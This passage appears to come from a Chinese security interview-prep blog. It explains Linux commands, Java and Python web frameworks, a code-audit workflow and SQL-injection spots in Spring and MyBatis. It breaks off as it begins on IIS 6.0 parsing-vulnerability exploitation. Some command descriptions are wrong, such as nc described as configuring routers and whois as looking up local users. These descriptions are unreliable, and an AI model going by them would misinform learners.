test，不管该目录下是否有子目录或文件，都直接删除</span><br></pre></td></tr></table></figure><p>(19) which - 用于查找文件<br>which指令会在环境变量$PATH设置的目录里查找符合条件的文件<br>实例：<br><code>which bash</code>  使用指令”which”查看指令”bash”的绝对路径</p><p>(20) cp - 用于复制文件或目录<br>语法：<br><code>cp file.txt /path/to/destination/</code>  将文件file.txt复制到目录 &#x2F;path&#x2F;to&#x2F;destination&#x2F; 中<br><code>cp -r test/ newtest</code>  使用指令cp将当前目录test下所有文件复制到新目录newtest下<br>注意：用户使用该指令复制目录时，必须使用参数 -r 或者 -R<br><code>cp -i file.txt /path/to/destination/</code>  复制文件，并在目标文件已存在时确认</p><p>(21) whereis - 用于查找文件<br>该指令会在特定目录中查找符合条件的文件。这些文件应属于原始代码、二进制文件，或是帮助文件。<br>该指令只能用于查找二进制文件、源代码文件和man手册页，一般文件的定位需使用locate命令。<br>实例：<br><code>whereis bash</code> 使用指令“whereis”查看“bash”的位置<br>上面指令执行后输出以下信息：<br><code>bash:/bin/bash/etc/bash.bashrc/usr/share/man/man1/bash.1.gz</code></p><p>(22) awk - 是一种处理文件的语言，是一个强大的文本分析工具<br><a href="https://www.runoob.com/linux/linux-comm-awk.html">Linux awk 命令</a></p><p>(23) read - 用于从标准输入读取数值<br>read 内部命令被用来从标准输入读取单行数据。这个命令可以用来读取键盘输入，当使用重定向的时候，可以读取文件中的一行数据。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">#这里默认会换行  </span><br><span class="line">echo &quot;输入网站名: &quot;  </span><br><span class="line">#读取从键盘的输入  </span><br><span class="line">read website  </span><br><span class="line">echo &quot;你输入的网站名是 $website&quot;  </span><br><span class="line">exit 0  #退出</span><br></pre></td></tr></table></figure><p>测试结果为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入网站名: </span><br><span class="line">www.x.com</span><br><span class="line">你输入的网站名是 www.x.com</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-read.html">Linux read 命令</a></p><p>(24) grep - 用于查找文件里符合条件的字符串或正则表达式<br>grep指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设grep指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 <code>-</code> ，则grep指令会从标准输入设备读取数据。<br>实例：<br><code>grep hello file.txt</code> 在文件file.txt中查找字符串“hello”，并打印匹配的行<br><code>grep -r -n pattern dir/</code> 在文件夹dir中递归查找所有文件中匹配正则表达式“pattern”的行，并打印匹配行所在的文件名和行号<br><code>echo &quot;hello world&quot; | grep -c world</code> 在标准输入中查找字符串“hello world”，并只打印匹配的行数<br><a href="https://www.runoob.com/linux/linux-comm-grep.html">Linux grep 命令</a></p><p>(25) sort - 用于将文本文件内容加以排序<br>sort可针对文本文件的内容，以行为单位来排序<br>实例：<br><code>sort testfile</code> 使用sort命令以默认的方式对文件的行进行排序</p><p>(26) tr - 用于转换或删除文件中的字符<br>tr命令从标准输入设备读取数据，经过字符串转译后，将结果输出到标准输出设备<br>实例：<br><code>cat testfile |tr a-z A-Z</code> 将文件testfile中的小写字母全部转化为大写字母</p><p>(27) let - 是BASH中用于计算的工具，用于执行一个或多个表达式，变量计算中不需要加上$来表示变量。如果表达式中包含了空格或其它特殊字符，则必须引起来。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">let a=5+4</span><br><span class="line">let b=9-3 </span><br><span class="line">echo $a $b</span><br></pre></td></tr></table></figure><p>(28) cd - 用于改变当前工作目录的命令，切换到指定的路径<br>若目录名称省略，则变换至使用者的home目录(也就是刚login时所在的目录)<br>另外， <code>~</code> 也表示home目录的意思， <code>.</code> 则是表示目前所在的目录， <code>..</code> 则表示目前目录位置的上一目录<br>实例：<br><code>cd /usr/bin</code> 切换到 &#x2F;usr&#x2F;bin&#x2F;目录<br><code>cd ..</code> 切换到上级目录<br><code>cd ~</code> 切换到用户主目录<br><code>cd -</code> 切换到上次访问的目录</p><p>(29) df - 用于显示目前在Linux系统上的文件系统磁盘使用情况统计<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df  //显示文件系统的磁盘使用情况统计</span><br><span class="line">Filesystem     1K-blocks    Used     Available Use% Mounted on </span><br><span class="line">/dev/sda6       29640780 4320704     23814388  16%     / </span><br><span class="line">udev             1536756       4     1536752    1%     /dev </span><br><span class="line">tmpfs             617620     888     616732     1%     /run </span><br><span class="line">none                5120       0     5120       0%     /run/lock </span><br><span class="line">none             1544044     156     1543888    1%     /run/shm </span><br></pre></td></tr></table></figure><p>第一列指定文件系统的名称，第二列指定一个特定的文件系统1K-块1K是1024字节为单位的总内存。用和可用列正在使用中，分别指定的内存量。<br>使用列指定使用的内存的百分比，而最后一栏”安装在”指定的文件系统的挂载点。<br><code>df --total</code> 显示所有的信息，输出的末尾，包含一个额外的行，显示总的每一列<br><code>df -h</code> 通过-h选项可以产生可读的格式df命令的输出</p><p>(30) du - 用于显示目录或文件的大小<br>du会显示指定的目录或文件所占用的磁盘空间<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">du  显示目录或文件所占空间</span><br><span class="line">608     ./test6</span><br><span class="line">308     ./test4</span><br><span class="line">4       ./scf/lib</span><br><span class="line">4       ./scf/service/deploy/product</span><br><span class="line">4       ./scf/service/deploy/info</span><br><span class="line">12      ./scf/service/deploy</span><br><span class="line">16      ./scf/service</span><br><span class="line">4       ./scf/doc</span><br><span class="line">4       ./scf/bin</span><br><span class="line">32      ./scf</span><br><span class="line">8       ./test3</span><br><span class="line">1288    .</span><br></pre></td></tr></table></figure><p><code>du -h test</code> 方便阅读的格式显示test目录所占空间情况</p><p>(31) mkdir - 用于创建目录<br>实例：<br><code>mkdir test</code> 在工作目录下，创建一个名为test的目录</p><p>(32) pwd - 用于显示工作目录<br>执行pwd指令可立刻得知目前所在的工作目录的绝对名称<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwd  // 查看当前所在目录</span><br><span class="line">/root/test           #输出结果</span><br></pre></td></tr></table></figure><p>(33) mount - 是经常会使用到的命令，它用于挂载Linux系统外的文件<br>实例：<br><code>mount /dev/hda1 /mnt</code> 将&#x2F;dev&#x2F;hda1挂在&#x2F;mnt之下</p><p>(34) rmdir - 删除空的目录<br>实例：<br><code>rmdir AAA</code> 将工作目录下，名为AAA的子目录删除</p><p>(35) ls - 用于显示指定工作目录下的内容(列出目前工作目录所含的文件及子目录)<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ls -l    # 以长格式显示当前目录中的文件和目录</span><br><span class="line">ls -a    # 显示当前目录中的所有文件和目录，包括隐藏文件</span><br><span class="line">ls -lh   # 以人类可读的方式显示当前目录中的文件和目录大小</span><br><span class="line">ls -t    # 按照修改时间排序显示当前目录中的文件和目录</span><br><span class="line">ls -l /etc/passwd  # 显示/etc/passwd文件的详细信息</span><br><span class="line">ls /     # 列出根目录(\)下的所有目录</span><br></pre></td></tr></table></figure><p>(36) telnet - 用于远程输入<br>执行telnet指令开启终端机阶段作业，并登入远端主机</p><p>(37) nc - 用于设置路由器<br>执行本指令可设置路由器的相关参数</p><p>(38) ifconfig - 用于显示或设置网络设备<br>ifconfig可设置网络设备的状态，或是显示目前的设置</p><p>(39) netstat - 用于显示网络状态<br>利用 netstat 指令可让你得知整个 Linux 系统的网络情况<br>实例：<br><code>netstat -a</code> 显示详细的网络状况<br><code>netstat -i</code> 显示网卡列表<br><code>netstat -s</code> 显示网络统计信息<br><code>netstat -l</code> 显示监听的套接口</p><p>(40) ping - 用于检测与另一个主机之间的网络连接<br>执行 ping 指令会使用 ICMP（Internet Control Message Protocol） 传输协议，发出要求回应的信息，若远端主机的网络功能没有问题，就会回应该信息，因而得知该主机运作正常<br>实例：<br><code>ping www.x.com //ping主机</code></p><p>(41) adduser - 用于新增使用者账号或更新预设的使用者资料<br>adduser与useradd为同一指令（经由符号连接symbolic link）<br>使用权限：系统管理员<br>adduser 是增加使用者。相对的，也有删除使用者的指令 userdel，语法为 <code>userdel [login ID]</code><br>实例：<br><code>adduser kk</code> 添加一个一般用户<br><code>adduser -g root kk</code> 为添加的用户指定相应的用户组<br><code>adduser -r kk</code> 创建一个系统用户<br><code>adduser -d /home/myf kk</code> 为新添加的用户指定&#x2F;home目录</p><p>(42) useradd - 用于建立用户账号<br>useradd 可用来建立用户帐号。帐号建好之后，再用 passwd 设定帐号的密码。而可用 userdel 删除帐号。使用 useradd 指令所建立的帐号，实际上是保存在 &#x2F;etc&#x2F;passwd 文本文件中<br>实例：<br><code>useradd tt</code> 添加一般用户<br><code>useradd -g root tt</code> 为添加的用户指定相应的用户组<br>和adduser命令相同</p><p>(43) date - 用来显示或设定系统的日期和时间<br>实例：<br><code>date</code> 显示当前时间<br><code>date + &quot;%Y-%m-%d&quot;</code> 格式化输出<br><code>date -s</code> 设置当前时间，只有root权限才能设置，其它只能查看</p><p>(44) exit - 用于退出目前的shell<br>实例：<br><code>exit</code> 退出终端</p><p>(45) finger - 可让使用者查询其它使用者的资料<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">finger -l  //列出当前登录用户的相关信息</span><br><span class="line">Login: root Name: root</span><br><span class="line">Directory: /root Shell: /bin/bash</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on :0 (messages off)</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on pts/1 32 days 22 hours idle</span><br><span class="line">On since Fri Apr 9 20:17 (CST) on pts/3 4 hours 5 minutes idle</span><br><span class="line">(messages off)</span><br><span class="line">On since Wed May 12 18:08 (CST) on pts/4 from 192.168.1.10</span><br><span class="line">On since Wed May 12 18:35 (CST) on pts/5 from 192.168.1.10</span><br><span class="line">7 minutes 54 seconds idle</span><br><span class="line">On since Wed May 12 14:37 (CST) on pts/2 from 192.168.1.10</span><br><span class="line">3 hours 14 minutes idle</span><br><span class="line">On since Wed May 12 14:53 (CST) on pts/7 34 minutes 25 seconds idle</span><br><span class="line">(messages off)</span><br><span class="line">On since Wed May 12 16:53 (CST) on pts/8 from 192.168.1.10</span><br><span class="line">30 minutes 18 seconds idle</span><br><span class="line">Mail last read Mon Mar 31 04:02 2008 (CST)</span><br><span class="line">No Plan.</span><br></pre></td></tr></table></figure><p><code>finger -m hnlinux</code> 显示指定用户信息<br><code>finger -m root@192.168.1.1</code> 显示远程用户信息</p><p>(46) sleep - 用来将目前动作延迟一段时间<br>使用权限：所有使用者<br>实例：<br><code>sleep 5m</code> 休眠5m<br><code>date;sleep 1m;date</code> 显示目前时间后延迟1分钟，之后再次显示时间</p><p>(47) kill - 用于删除执行中的程序或工作<br>kill 可将指定的信息送至程序。预设的信息为 SIGTERM(15)，可将指定程序终止。若仍无法终止该程序，可使用 SIGKILL(9) 信息尝试强制删除程序。程序或工作的编号可利用 ps 指令或 jobs 指令查看。<br>实例：<br><code>kill 12345</code> 杀死进程<br><code>kill -KILL 123456</code> 强制杀死进程<br><code>kill -9 123456</code> 彻底杀死进程<br><code>kill -u hnlinux</code> 杀死指定用户所有进程</p><p>(48) last - 用于显示用户最近的登录信息<br>单独执行last命令，它会读取位于&#x2F;var&#x2F;log&#x2F;目录下，名称为wtmp的文件，并把该文件记录登录的用户名，全部显示出来<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">last -R -2  #显示两行，并省略主机名hostname的列</span><br><span class="line">root     pts/0        Thu Apr 28 18:06   still logged in</span><br><span class="line">root     pts/0        Tue Apr 26 09:06 - 19:36  (10:30)</span><br><span class="line"></span><br><span class="line">wtmp begins Sun Apr  3 13:11:25 2022</span><br></pre></td></tr></table></figure><p><code>last</code> 一般显示方法</p><p>(49) shutdown - 用来进行关机程序<br>在关机以前传送讯息给所有使用者正在执行的程序，shutdown也可以用来重开机<br>使用权限：系统管理者<br>实例：<br><code>shutdown -h now</code> 立即关机<br><code>shutdown -h 10</code> 10分钟后关机<br><code>shutdown -r now</code> 重新启动计算机</p><p>(50) sudo - 以系统管理者的身份执行命令<br>使用权限：在 &#x2F;etc&#x2F;sudoers 中有出现的使用者<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ls</span><br><span class="line">[sudo] password for hnlinux: </span><br><span class="line">hnlinux is not in the sudoers file. This incident will be reported.</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/linux/linux-comm-sudo.html">Linux sudo命令</a></p><p>(51) ps - 用于显示当前进程状态，类似于Windows的任务管理器<br>实例：<br><code>ps -ef | grep 进程关键字</code> 查找指定进程格式<br><code>ps -A</code> 显示进程信息<br><code>ps -u root</code> 显示root进程用户信息</p><p>(52) wc - 统计指定的文件中字节数、字数、行数，并将统计结果输出<br>实例：<br><code>wc text.txt</code> 查找文件的行数 单词数 字节数 文件名。 结果: <code>7     8     70     test.txt</code><br><code>cat text.txt | wc -l</code> 统计输出结果的行数</p><p>(53) locate - 通过搜寻系统内建文档数据库达到快速找到档案<br>默认情况下 locate 命令在搜寻数据库时比由整个由硬盘资料来搜寻资料来得快，但较差劲的是 locate 所找到的档案若是最近才建立或 刚更名的，可能会找不到，在内定值中，updatedb 每天会跑一次，可以由修改 crontab 来更新设定值 (etc&#x2F;crontab)。<br>locate 与 find 命令相似，可以使用如 *、? 等进行正则匹配查找<br>实例：<br><code>locate pwd</code> 查找和pwd相关的所有文件(文件名中包含pwd)<br><code>locate /etc/sh</code> 搜索etc目录下所有以sh开头的文件<br><code>locate -r &#39;^/var.*reason$&#39;  //(其中.表示一个字符，*表示任务多个；.*表示任意多个字符)</code> 查找&#x2F;var目录下，以reason结尾的文件</p><p>(54) tail - 用于显示指定文件末尾内容，不指定文件时，作为输入信息进行处理。常用查看日志文件。<br>实例：<br><code>tail notes.log</code> 显示notes.log文件的最后10行<br><code>tail -n 100 /etc/cron</code> 显示最后100行数据</p><p>(55) uname - 用于显示操作系统信息，例如内核版本、主机名、处理器类型等<br>uname可显示电脑及操作系统的相关信息<br>实例：<br><code>uname -a</code> 显示系统信息<br><code>uname -m</code> 显示计算机类型<br><code>uname -n</code> 显示计算机名<br><code>uname -s</code> 显示操作系统名称<br><code>uname -v</code> 显示系统版本与时间</p><p>(56) who - 用于显示系统中有哪些使用者正在上面<br>显示的资料包含了使用者id、使用的终端机、从哪边连上来的、上线时间、呆滞时间、CPU使用量、动作等等<br>使用权限：所有使用者都可使用<br>实例：<br><code>who</code> 显示当前登录系统的用户<br><code>who -l -H</code> 显示用户登录来源<br><code>who -m -H</code> 只显示当前用户</p><p>(57) whoami - 用于显示自身用户名称<br>显示自身的用户名称，相当于执行 <code>id -un</code> 指令<br>实例：<br><code>whoami</code> 显示用户名</p><p>(58) whois - 用于查找并显示用户信息<br>whois指令会去查找并显示指定帐号的用户相关信息，因为它是到Network Solutions的WHOIS数据库去查找，所以该帐号名称必须在上面注册方能寻获，且名称没有大小写的差别<br>实例：<br><code>whois root</code> 查找root用户信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">whois Lx138.COm   //查找域名信息</span><br><span class="line"></span><br><span class="line">The Registry database contains ONLY .COM, .NET, .EDU domains and</span><br><span class="line">Registrars.</span><br><span class="line">Domain Name ..................... Lx138.COm</span><br><span class="line">Name Server ..................... dns15.hichina.com</span><br><span class="line">                 dns16.hichina.com</span><br><span class="line">Registrant ID ................... hc937242545-cn</span><br><span class="line"></span><br><span class="line">...省略部分内容</span><br></pre></td></tr></table></figure><p><code>whois -p 80 Lx138.com</code> 指定端口查询</p><p>(59) su - 用于变更为其它使用者的身份，除root外，需要键入该使用者的密码<br>使用权限：所有使用者。<br>实例：<br><code>su root</code> 变更账号为root<br><code>su -c ls root</code>   变更帐号为 root 并在执行 ls 指令后退出变回原使用者</p><p>(60) id - 用于显示用户的id，以及所属群组的id<br>id 会显示用户以及所属群组的实际与有效 ID，若两个 ID 相同，则仅显示实际 ID，若仅指定用户名称，则显示目前用户的 ID。<br>该命令会显示用户的 UID（User ID）、GID（Group ID）以及附属于用户的所有组 ID。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id   //显示当前用户id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) context=root:system_r:unconfined_t</span><br></pre></td></tr></table></figure><p><code>id -g</code> 显示用户群组的id</p><p>(61) free - 用于显示内存状态<br>free指令会显示内存的使用情况，包括实体内存，虚拟的交换文件内存，共享内存区段，以及系统核心使用的缓冲区等。<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free  //显示内存使用信息</span><br><span class="line">total used free shared buffers cached</span><br><span class="line">Mem: 254772 184568 70204 0 5692 89892</span><br><span class="line">-/+ buffers/cache: 88984 165788</span><br><span class="line">Swap: 524280 65116 459164</span><br></pre></td></tr></table></figure><p>(62) groupadd - 用于创建一个新的工作组，新工作组的信息将被添加到系统文件中<br>相关文件:<br>&#x2F;etc&#x2F;group 组账户信息。<br>&#x2F;etc&#x2F;gshadow 安全组账户信息。<br>&#x2F;etc&#x2F;login.defs Shadow密码套件配置<br>实例：<br><code>groupadd -g 344 abc</code>  创建一个新的组，并添加组id<br>此时在 &#x2F;etc&#x2F;group 文件中产生一个组 ID（GID）是 344 的项目。</p><p>(63) clear - 用于清除屏幕<br>实例：<br><code>clear</code> 清除</p><p>(64) eval - 用于重新运算求出参数内容<br>eval可读取一连串的参数，然后再依参数本身的特性来执行。<br>实例：<br><code>eval enable;ls</code> 连接多个命令</p><p>(65) passwd - 用于更改使用者的密码<br>实例：<br><code>passwd root</code> 修改root用户密码<br><code>passwd -S root</code> 显示账号密码信息<br><code>passwd -d lx135</code> 删除用户密码</p><p>(66) dump - 用于备份文件系统<br>dump为备份工具程序，可将目录或整个文件系统备份至指定的设备，或备份成一个大文件<br>实例：<br><code>dump -0 -u /dev/tape /home/</code> 备份文件到磁带</p><p>(67) gzip - 用于压缩文件<br>gzip是个使用广泛的压缩程序，文件经它压缩过后，其名称后面会多出”.gz”的扩展名。<br>实例：<br><code>gzip *</code> 压缩当前目录下所有文件</p><p>(68) tar - 用于备份文件<br>tar 是用来建立，还原备份文件的工具程序，它可以加入，解开备份文件内的文件<br>实例：<br><code>tar -czvf test.tar.gz a.c</code> 压缩a.c文件为test.tar.gz<br><code>tar -tzvf test.tar.gz</code> 列出压缩文件内容<br><code>tar -xzvf test.tar.gz</code> 解压文件<br><a href="https://www.runoob.com/linux/linux-comm-tar.html">Linux tar 命令</a></p><p>(69) unzip - 用于解压缩zip文件<br>unzip为.zip压缩文件的解压缩程序<br>实例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -l abc.zip   //查看压缩文件中包含的文件</span><br><span class="line">Archive: abc.zip</span><br><span class="line"> Length   Date  Time  Name</span><br><span class="line">--------  ----  ----  ----</span><br><span class="line">  94618 05-21-10 20:44  a11.jpg</span><br><span class="line">  202001 05-21-10 20:44  a22.jpg</span><br><span class="line">    16 05-22-10 15:01  11.txt</span><br><span class="line">  46468 05-23-10 10:30  w456.JPG</span><br><span class="line">  140085 03-14-10 21:49  my.asp</span><br><span class="line">--------          -------</span><br><span class="line">  483188          5 files</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">unzip -v abc.zip   //用于查看压缩文件目录信息，但是不解压该文件</span><br><span class="line">Archive: abc.zip</span><br><span class="line">Length  Method  Size Ratio  Date  Time  CRC-32  Name</span><br><span class="line">-------- ------ ------- -----  ----  ----  ------  ----</span><br><span class="line">  94618 Defl:N  93353  1% 05-21-10 20:44 9e661437 a11.jpg</span><br><span class="line"> 202001 Defl:N  201833  0% 05-21-10 20:44 1da462eb a22.jpg</span><br><span class="line">   16 Stored    16  0% 05-22-10 15:01 ae8a9910 ? +-|￥+-? (11).txt</span><br><span class="line">  46468 Defl:N  39997 14% 05-23-10 10:30 962861f2 w456.JPG</span><br><span class="line"> 140085 Defl:N  36765 74% 03-14-10 21:49 836fcc3f my.asp</span><br><span class="line">--------     ------- ---              -------</span><br><span class="line"> 483188      371964 23%              5 files</span><br></pre></td></tr></table></figure><p>(70) zip - 用于压缩文件<br>zip 是个使用广泛的压缩程序，压缩后的文件后缀名为 .zip<br>实例：<br><code>zip -q -r html.zip /home/html</code> 将 &#x2F;home&#x2F;html&#x2F; 这个目录下所有文件和文件夹打包为当前目录下的 html.zip<br><code>zip -q -r html.zip *</code> 将当前目录下所有文件和文件夹打包为html.zip<br><code>zip -dv cp.zip a.c</code> 从压缩文件cp.zip中删除文件a.c</p><p>(71) poweroff - 用于关闭计算机并切断电源<br>使用权限：系统管理者<br>实例：<br><code>poweroff</code> 关闭系统</p><h1 id="框架"><a href="#框架" class="headerlink" title="框架"></a>框架</h1><ol><li>常见web开发Java框架</li></ol><p>(1) Spring: Spring是一个全栈Java框架，包含了许多模块，可以用于开发各种类型的Web应用程序。Spring MVC是Spring框架中用于Web开发的模块，它提供了一个MVC架构，可以简化Web应用程序的开发。<br>(2) Apache Struts: Struts是一个基于MVC架构的Web开发框架，它是Spring MVC之前比较流行的Web开发框架。<br>(3) Grails：Grails是一个基于Groovy语言的Web开发框架，它是一个基于Spring的框架，提供了一个MVC架构，可以简化Web应用程序的开发。<br>(4) Hibernate：Hibernate是一个ORM框架，它可以简化数据库访问。<br>(5) JSF：JSF是一个基于Java的Web开发框架，它提供了一个MVC架构，可以简化Web应用程序的开发。</p><ol start="2"><li>Java哪些框架，审过哪些框架，它们常出现的问题是什么？</li></ol><p>Java框架：见问题1<br>审过哪些框架：<br>Java三层架构：数据访问层、业务逻辑层、表现层。<br>(1) 持久层(Data Access Layer DAL，数据访问层)采用DAO模式。建立实体类和数据库表映射（ORM映射）。也就是哪个类对应哪个表，哪个属性对应哪个列。持久层的目的是，完成对象数据和关系数据的转换。<br>(2) 业务层(Business Logic Layer BLL, 逻辑层、service层)采用事务脚本模式。将一个业务中所有的操作封装成一个方法，同时保证方法中所有的数据库更新操作，即保证同时成功或同时失败。避免部分成功部分失败造成的数据库混乱操作。<br>(3) 表现层(UI层、视图层、界面层)采用MVC(Model-ViewController)模式，采用JSP&#x2F;Servlet技术进行页面效果显示。</p><p>SSH框架<br>业务层：Spring<br>表现层：Struts<br>持久层：Hibernate</p><p>SSM框架<br>业务层：Spring<br>表现层：SpringMVC<br>持久层：MyBatis</p><p><a href="https://paper.seebug.org/1075/">Java框架级SSM代码审计思路</a></p><p>@ 代码审计的流程和思路：<br>(1) 收集信息：查看源码、分析日志、使用工具等方式，收集目标用户程序的信息，包括但不限于：应用程序的文件目录结构、配置文件、程序源码、请求参数、数据库结构等。<br>(2) 风险评估：根据收集到的信息，分析应用程序中可能存在的漏洞和安全隐患，并对进行评估，确定哪些漏洞最为严重、哪些应该优先修复。<br>(3) 漏洞挖掘：通过手动测试和工具扫描等方式，对应用程序进行漏洞挖掘。测试应包括各种类型的漏洞，例如：SQL注入、跨站脚本、CSRF等。<br>(4) 漏洞验证：验证漏洞是否真实存在，并确认漏洞的影响程序、可能的攻击方式和风险级别。<br>(5) 报告编写：将漏洞及其影响、攻击方式、风险级别等信息整理成报告，供开发者和管理者参考。报告应该详细说明漏洞的位置、修复建议等具体内容，并提供漏洞的Poc（漏洞利用代码）。<br>(6) 漏洞修复：由开发人员修复漏洞，并通过测试验证修复效果。在修复漏洞之后，应再次进行代码审计，以确保没有新漏洞产生。</p><p>审过spring框架，MyBatis框架，常出现的问题是SQL注入。<br>spring框架情况：Statement直接拼接sql语句造成SQL语句漏洞。<br>MyBatis框架情况：使用like语句进行模糊查询；使用in语句；使用order by语句。<br><a href="https://www.ctfiot.com/133145.html">Java代码审计—SQL注入篇</a></p><ol start="3"><li>python的web框架（flask&#x2F;django）</li></ol><p>Django：Django是一个全栈Web框架，提供了丰富的功能，可以满足各种Web应用程序的需求。Django是目前最流行的Python Web框架，具有功能强大、易用性高、可扩展性强等优点。</p><p>Flask：Flask是一个轻量级Web框架，专注于提供核心功能并保持简单易懂。Flask适合开发小型到中型Web应用程序。</p><ol start="4"><li>了解struts框架吗？说一说</li></ol><p>Struts 是一个开源框架，用于扩展 Java Servlet API 并使用MVC(模型、视图、控制器)体系结构。<br>Struts框架提供如下服务：<br>(1) 作为控制器的Servlet<br>(2) 提供大量的标签库<br>(3) 提供了用于国际化的框架，利用不同的配置文件，可以帮助用户选择适合自己的语言。<br>(4) 提供了JDBC的实现，来定义数据源和数据库连接池。<br>(5) XML语法分析工具。<br>(6) 文件下载机制。</p><p>Struts原理：<br>Struts是对JSPModel2设计标准的一种实现，下面分别从模型（Model）、视图（view）和控制器3个部分介绍Struts的体系结构和工作原理。<br>（1）视图（view）<br>在Struts中，视图层包含两个部分，JSP页面和ActionForm。<br>ActionForm封装了用户提交的表单信息，其实ActonForm本质上就是JavaBean，这些JavaBean中没有业务逻辑，只提供了所有属性的getter和setter方法，这些属性和用户表单中的输入项是一一对应的。在Struts中就是通过ActionForm把用户表单信息提交给控制器。<br>JSP页面是经典MVC中主要的视图组件，主要是信息显示和控制器处理结果显示的功能。<br>除了以上，struts还提供了一个强大的struts标签库，来帮助用户解决显示逻辑，并且利用ActonForm组件将信息传递到控制层。</p><p>（2）控制器（Controller）<br>在控制层，struts提供了一个控制器组件ActionServlet，它继承自HttpServlet，并重载了HttpServlet的doGet()，doPost()方法，可以接受HTTP的响应，并进行转发，同时还提供了使用XML进行转发Mapping（映射）的功能。</p><p>（3）模型（Model）<br>模型表示状态和业务逻辑的处理，在一般的web应用程序中，用JavaBean或者EJB来实现系统的业务逻辑。在Struts中，struts提供Action对象，来管理业务逻辑的调用，帮助用户分离业务逻辑，也就是说struts本身不实现业务逻辑，但可以调用已完成的业务逻辑。</p><p>Struts工作流程：<br>ActionServlet是struts中核心的控制器，所有的用户请求都必须通过ActionServlet的处理，而struts-config.xml是struts中核心的配置文件，在这个文件中配置了用户请求URL和控制器Action的映射关系，ActionServlet通过这个配置文件把用户的请求发送到对应的控制器中。<br><a href="https://zhuanlan.zhihu.com/p/26316119">Struts简介和原理</a></p><h1 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h1><ol><li>@ 说说常见的中间件解析漏洞利用方式。</li></ol><p>中间件解析漏洞利用方式：<br>(1) IIS 解析漏洞：<br>成因：IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。<br>利用方式：<br>IIS 6.0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iis6.0畸形解析：asa、cer</span><br><span 